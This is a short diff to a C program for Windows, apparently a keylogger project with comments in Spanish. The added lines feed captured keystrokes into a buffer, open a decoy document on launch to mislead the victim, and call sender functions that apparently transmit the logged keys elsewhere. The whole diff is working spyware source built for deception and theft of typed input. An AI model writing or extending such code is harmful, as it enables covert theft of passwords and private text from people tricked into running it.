@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <windows.h>
+#include "mailman.h"
 
 HHOOK keyboardHook;
 
@@ -10,6 +11,8 @@ unsigned char lShift = 0, rShift = 0, ignoreLShift = 0, ignoreRShift = 0;
 
 void processKey(const char* b) {
     printf("%s\n", b);
+    //hacer llamada a función de creación de palabra
+    addKeyToBuffer(b);
 }
 
 LRESULT CALLBACK hookCallback(int code, WPARAM wParam, LPARAM lParam) {
@@ -122,13 +125,22 @@ LRESULT CALLBACK hookCallback(int code, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(keyboardHook, code, lParam, wParam);
 }
 
+
+//Main
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+    //abir cebo
+    ShellExecute(NULL, "open", KEYLOGGER_FAKE_DOCUMENT, NULL, NULL, SW_SHOWNORMAL);
+
+    initSender();
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookCallback, hInstance, 0);
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
+        
     }
     UnhookWindowsHookEx(keyboardHook);
+    sendBuffer();
+    CleanUpSender();
     return 0;
 }
